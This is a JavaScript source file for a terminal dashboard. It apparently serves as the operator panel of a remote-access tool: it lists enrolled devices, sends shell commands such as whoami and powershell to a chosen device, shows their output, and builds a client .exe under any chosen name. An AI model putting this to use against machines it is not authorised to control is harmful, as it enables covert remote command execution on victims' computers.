// tui/dashboard.js

import blessed from 'blessed';

import { getAllDevices } from '../server/database.js';
import { sendCommand } from '../server/server.js';
import { buildArtifact } from '../utils/builder.js';  // adjust path if needed
import { subscribe } from './outputBus.js';
import { attachLogger } from '../utils/logger.js';


/* ============================
   DASHBOARD
============================ */

export function startDashboard() {

  /* ============================
     SCREEN
  ============================ */

  const screen = blessed.screen({
    smartCSR: true,
    input: process.stdin,
    output: process.stdout,
    terminal: 'xterm-256color',
    fullUnicode: true,
    title: 'Control Panel'
  });

  screen.enableKeys();
  screen.enableMouse();


  /* ============================
     STATE
  ============================ */

  let mode = 'main'; // main | list | command | build | placeholder

  let devices = [];
  let activeUUID = null;

  let mainMenu = null;
  let table = null;

  let infoBox = null;
  let outputBox = null;
  let inputBox = null;

  let logBox = null;
  let status = null;


  /* ============================
     STATUS BAR
  ============================ */

  status = blessed.box({
    parent: screen,
    bottom: 0,
    height: 1,
    width: '100%',
    style: {
      bg: 'gray',
      fg: 'black'
    },
    content: ' Q Quit '
  });


  /* ============================
     LOG PANEL (global)
  ============================ */

  logBox = blessed.log({
    parent: screen,
    bottom: 1,
    height: '25%',
    width: '100%',
    border: 'line',
    label: ' Logs ',
    scrollable: true,
    alwaysScroll: true,
    scrollbar: {
      ch: '│',
      track: { bg: 'grey' },
      style: { inverse: true }
    },
    tags: true
  });


  /* ============================
     LOGGER
  ============================ */

  attachLogger((msg) => {
    logBox.add(msg);
    screen.render();
  });


  /* ============================
     MAIN MENU
  ============================ */

  function showMain() {
    clearUI();
    mode = 'main';

    status.setContent(' ↑↓ Move | Enter Select | Q Quit ');

    mainMenu = blessed.list({
      parent: screen,
      top: 0,
      height: '75%',
      width: '100%',
      border: 'line',
      label: ' Main Panel ',
      keys: true,
      mouse: true,
      style: {
        selected: { bg: 'blue' }
      },
      items: [
        '▶ Device Interaction',
        '▶ Build Artifact',
        '▶ Sign Client',
        '▶ Publish',
        '▶ Exit'
      ]
    });

    mainMenu.focus();

    mainMenu.on('select', (item, index) => {
      switch (index) {
        case 0: showDeviceList(); break;
        case 1: showBuildArtifactScreen(); break;
        case 2: showPlaceholder('Sign Client'); break;
        case 3: showPlaceholder('Publish'); break;
        case 4: quit(); break;
      }
    });

    screen.render();
  }


  /* ============================
     PLACEHOLDER PAGES
  ============================ */

  function showPlaceholder(title) {
    clearUI();
    mode = 'placeholder';

    status.setContent(' ESC Back | Q Quit ');

    const box = blessed.box({
      parent: screen,
      top: 0,
      height: '75%',
      width: '100%',
      border: 'line',
      label: ` ${title} `,
      content: '\n This feature is not implemented yet.\n\n Coming soon...'
    });

    screen.render();

    screen.key('escape', () => showMain());
  }


  /* ============================
     DEVICE LIST
  ============================ */

  function showDeviceList() {
    clearUI();
    mode = 'list';

    status.setContent(' ↑↓ Move | Enter Open | ESC Back | Q Quit ');

    table = blessed.listtable({
      parent: screen,
      top: 0,
      height: '75%',
      width: '100%',
      border: 'line',
      keys: true,
      mouse: true,
      interactive: true,
      style: {
        header: { bold: true },
        cell: {
          selected: { bg: 'blue', fg: 'white' }
        }
      }
    });

    refreshDevices();

    const refreshInterval = setInterval(() => {
      if (mode === 'list') refreshDevices();
    }, 2000);

    table.focus();

    table.on('select', (_, index) => {
      if (index === 0) return;
      const dev = devices[index - 1];
      if (!dev) return;
      openCommand(dev);
    });

    // Cleanup interval when leaving this screen
    screen.key('escape', () => {
      clearInterval(refreshInterval);
      showMain();
    });

    screen.render();
  }

  function refreshDevices() {
    devices = getAllDevices();

    const rows = [
      ['UUID', 'Host', 'IP', 'Status', 'Last Seen']
    ];

    for (const d of devices) {
      rows.push([
        d.uuid,
        d.hostname,
        d.last_ip || '-',
        d.status,
        new Date(d.last_seen * 1000).toLocaleTimeString()
      ]);
    }

    table.setData(rows);
    screen.render();
  }


  /* ============================
     BUILD ARTIFACT SCREEN
  ============================ */

  function showBuildArtifactScreen() {
    clearUI();
    mode = 'build';

    status.setContent(' Type app name | Enter to build | ESC Back | Q Quit ');

    const buildBox = blessed.box({
      parent: screen,
      top: 0,
      height: '75%',
      width: '100%',
      border: 'line',
      label: ' Build Artifact ',
      content: 'Enter the name for the application (will be used as exe name):'
    });

    const nameInput = blessed.textbox({
      parent: screen,
      top: 8,
      left: 2,
      width: '90%',
      height: 3,
      border: 'line',
      label: ' App Name ',
      inputOnFocus: true,
    });

    const logBoxBuild = blessed.log({
      parent: screen,
      top: 12,
      bottom: 3,
      width: '100%',
      border: 'line',
      label: ' Build Log ',
      tags: true,
      scrollable: true,
      alwaysScroll: true,
      scrollbar: {
        ch: '│',
        track: { bg: 'grey' },
        style: { inverse: true }
      }
    });

    nameInput.focus();

    nameInput.on('submit', async (value) => {
      const appName = value.trim();

      if (!appName) {
        logBoxBuild.add('{red-fg}Error: App name cannot be empty{/red-fg}');
        nameInput.focus();
        screen.render();
        return;
      }

      logBoxBuild.add(`{cyan-fg}Starting build for: ${appName}{/cyan-fg}`);
      screen.render();

      try {
        logBoxBuild.add('Building... (this may take a few minutes)');
        screen.render();

        const builtPath = await buildArtifact(appName);

        logBoxBuild.add('');
        logBoxBuild.add('{green-fg}Build completed successfully!{/green-fg}');
        logBoxBuild.add(`Output: ${builtPath}`);
        logBoxBuild.add('');
        logBoxBuild.add('{yellow-fg}Tip: Artifact saved in builds/<name>/<name>.exe{/yellow-fg}');
        logBoxBuild.add('Press ESC to go back');
      } catch (err) {
        logBoxBuild.add('');
        logBoxBuild.add('{red-fg}Build failed:{/red-fg}');
        logBoxBuild.add(err.message || String(err));
        if (err.stack) logBoxBuild.add(err.stack.split('\n').slice(1).join('\n'));
      }

      screen.render();
      nameInput.focus();
    });

    screen.key('escape', () => showMain());

    screen.render();
  }


  /* ============================
     COMMAND PANEL
  ============================ */

  function openCommand(device) {
    clearUI();

    mode = 'command';
    activeUUID = device.uuid;

    status.setContent(' Type command | Enter = Send | ESC = Back | Q = Quit ');

    infoBox = blessed.box({
      parent: screen,
      top: 0,
      left: 0,
      right: 0,
      height: 7,
      border: 'line',
      label: ' Device Info ',
      tags: true,
      content: [
        `{bold}UUID:{/bold}   ${device.uuid}`,
        `{bold}Host:{/bold}   ${device.hostname}`,
        `{bold}IP:{/bold}     ${device.last_ip || '-'}`,
        `{bold}Status:{/bold} ${device.status}`,
      ].join('\n')
    });

    outputBox = blessed.log({
      parent: screen,
      top: 7,              // right after infoBox
      bottom: 7,           // leave space for input + margin
      left: 0,
      right: 0,
      border: 'line',
      label: ' Command Output ',
      scrollable: true,
      alwaysScroll: true,
      scrollbar: {
        ch: '│',
        track: { bg: 'grey' },
        style: { inverse: true }
      },
      tags: true
    });

    inputBox = blessed.textbox({
      parent: screen,
      bottom: 4,           // above global log (1) + status (1) + padding
      left: 0,
      right: 0,
      height: 3,
      border: 'line',
      label: ' Command (press Enter to send) ',
      inputOnFocus: true,
      style: {
        focus: { border: { fg: 'green' } }
      }
    });

    inputBox.focus();

    inputBox.on('submit', (cmd) => {
      cmd = cmd.trim();
      if (!cmd) {
        inputBox.clearValue();
        inputBox.focus();
        return;
      }

      outputBox.add(`{cyan-fg}→ ${cmd}{/cyan-fg}`);

      const ok = sendCommand(activeUUID, cmd, 'cmd');

      if (!ok) {
        outputBox.add('{red-fg}× Device appears to be offline{/red-fg}');
        status.setContent(' Device Offline | ESC Back | Q Quit ');
      } else {
        status.setContent(' Command sent | Type next... | ESC Back | Q Quit ');
      }

      inputBox.clearValue();
      inputBox.focus();
      outputBox.setScrollPerc(100);
      screen.render();
    });

    // Initial help text
    outputBox.add('{gray-fg}Connected to device. Type commands and press Enter.{/gray-fg}');
    outputBox.add('{gray-fg}Examples: dir, whoami, ipconfig, powershell ...{/gray-fg}');
    outputBox.add('');

    screen.render();
  }


  /* ============================
     OUTPUT BUS
  ============================ */

  subscribe((uuid, payload) => {
    if (uuid !== activeUUID) return;
    if (!outputBox) return;

    if (payload.stream) {
      outputBox.pushLine(payload.stream);
    }
    if (payload.stdout) {
      outputBox.pushLine(payload.stdout);
    }
    if (payload.stderr) {
      outputBox.pushLine('{red-fg}[ERR] ' + payload.stderr + '{/red-fg}');
    }

    outputBox.setScrollPerc(100);
    screen.render();
  });


  /* ============================
     HELPERS
  ============================ */

  function clearUI() {
    if (mainMenu) mainMenu.destroy();
    if (table) table.destroy();
    if (infoBox) infoBox.destroy();
    if (outputBox) outputBox.destroy();
    if (inputBox) inputBox.destroy();

    mainMenu = null;
    table = null;
    infoBox = null;
    outputBox = null;
    inputBox = null;
  }

  function quit() {
    screen.destroy();
    process.exit(0);
  }


  /* ============================
     GLOBAL KEYS
  ============================ */

  screen.on('keypress', (ch, key) => {
    if (!key) return;

    if (key.name === 'q' || key.full === 'C-c') {
      quit();
    }

    if (key.name === 'escape') {
      if (mode === 'command') {
        showDeviceList();
      }
      else if (mode === 'list' || mode === 'placeholder' || mode === 'build') {
        showMain();
      }
    }
  });


  /* ============================
     START
  ============================ */

  showMain();
  screen.render();
}